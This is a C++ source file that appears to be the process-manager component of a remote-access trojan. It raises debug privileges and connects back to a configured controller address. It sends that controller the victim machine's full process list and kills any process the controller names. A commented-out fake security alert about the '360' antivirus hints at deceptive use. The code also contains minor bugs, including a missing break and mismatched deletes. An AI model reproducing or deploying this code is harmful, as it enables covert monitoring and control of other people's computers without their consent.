#include "Process.H"
#include "Command.h"
#include <tlhelp32.h>
#include <psapi.h>

bool getPrivilege(const char *PName,BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	CloseHandle(hToken);
	return bResult;	
}



int bufSize = 0;
int processCount = 0;

void getProcessList(SOCKET windowManagerSocket, LPMsgHead lpMsgHead){
	/*bufferSize = 0;
	windowCount = 0;

	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)lpBuffer);
	lpMsgHead->dwCmd =  8888;
	lpMsgHead->dwSize = bufferSize;
	lpMsgHead->dwExtend1 = windowCount;
	SendMsg(windowManagerSocket, lpBuffer, lpMsgHead);
	delete lpBuffer;
	*/
	bufSize = 0;
	processCount = 0;
	char *lpBuffer = new char [1024 * 200]; 
	memset(lpBuffer, 0, 1024*200);

	HANDLE			hSnapshot = NULL;
	HANDLE			hProcess = NULL;
	HMODULE			hModules = NULL;
	PROCESSENTRY32	pe32 = {0};
	DWORD			cbNeeded;
	char			strProcessName[MAX_PATH] = {0};

	getPrivilege(SE_DEBUG_NAME, TRUE);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(hSnapshot == INVALID_HANDLE_VALUE)
		return ;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if(Process32First(hSnapshot, &pe32))
	{	  
		do
		{      
			
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			if ((pe32.th32ProcessID !=0 ) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
			{
				LPProcessInfo pProcessInfo = new ProcessInfo;
				memset(pProcessInfo->strTitle, 0, sizeof(pProcessInfo->strTitle));
				memset(pProcessInfo->strPath, 0, sizeof(pProcessInfo->strPath));
				pProcessInfo->dwProcessID = 0;
				EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
				GetModuleFileNameEx(hProcess, hModules, strProcessName, sizeof(strProcessName));
				pProcessInfo->dwProcessID = pe32.th32ProcessID; 
				memcpy(pProcessInfo->strTitle , pe32.szExeFile, lstrlen(pe32.szExeFile));
				memcpy(pProcessInfo->strPath, strProcessName, lstrlen(strProcessName));
				memcpy(lpBuffer + bufSize, pProcessInfo, sizeof(ProcessInfo));
				bufSize += sizeof(ProcessInfo);
				processCount++;
				delete pProcessInfo;
			}
		}
		while(Process32Next(hSnapshot, &pe32));
	}
	getPrivilege(SE_DEBUG_NAME, FALSE); 
	CloseHandle(hSnapshot);

	lpMsgHead->dwCmd =  8888;
	lpMsgHead->dwSize = bufSize;
	lpMsgHead->dwExtend1 = processCount;
	SendMsg(windowManagerSocket, lpBuffer, lpMsgHead);
	delete lpBuffer;
}



void deleteProcess(DWORD id){
	getPrivilege(SE_SHUTDOWN_NAME,TRUE);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
	TerminateProcess(hProcess, 0);
	CloseHandle(hProcess);
    getPrivilege(SE_SHUTDOWN_NAME, FALSE);
}



void processManager(){
	struct sockaddr_in LocalAddr;
	LocalAddr.sin_family=AF_INET;
	LocalAddr.sin_port = htons(ConnectInfo::getConnectInfo()->port);
	LocalAddr.sin_addr.S_un.S_addr= inet_addr(ConnectInfo::getConnectInfo()->ipAddress);

	SOCKET processManagerSocket = socket(AF_INET, SOCK_STREAM, 0);//重新建立一个专门的socket和客户端进行交互
	if(connect(processManagerSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
	{
		closesocket(processManagerSocket);
		return ;//connect error
	}

	MsgHead msgHead;
	char *chBuffer = new char[1536 * 1024]; //数据交换区 1.5MB

	//send socket type 
	msgHead.dwCmd = CMD_PROCESS_MANAGER_DLG_SHOW;
	msgHead.dwSize = 0;
	if(!SendMsg(processManagerSocket, chBuffer, &msgHead))
	{
		if(chBuffer != NULL)
			delete []chBuffer;

		closesocket(processManagerSocket);
		return ;//send socket type error
	}
	bool flag = true;
	while(flag)
	{
		//接收命令
		if(!RecvMsg(processManagerSocket, chBuffer, &msgHead))
			break;

		//解析命令
		switch(msgHead.dwCmd)
		{
		case CMD_SHOW_PROCESS_LIST:
			{
				getProcessList(processManagerSocket, &msgHead);
			}
			break;
		case CMD_PROCESS_DELETE:
			{
			   
			deleteProcess(msgHead.dwExtend1);
			}
		default:
			{
				//::MessageBox(NULL,"您的360出现问题！", "您的360出现问题！", MB_OK);
			} 
			break;

		}
		memset(chBuffer, 0, 1536 * 1024);
	}
	if(chBuffer != NULL)
		delete[] chBuffer;
	closesocket(processManagerSocket);
	return ;
}



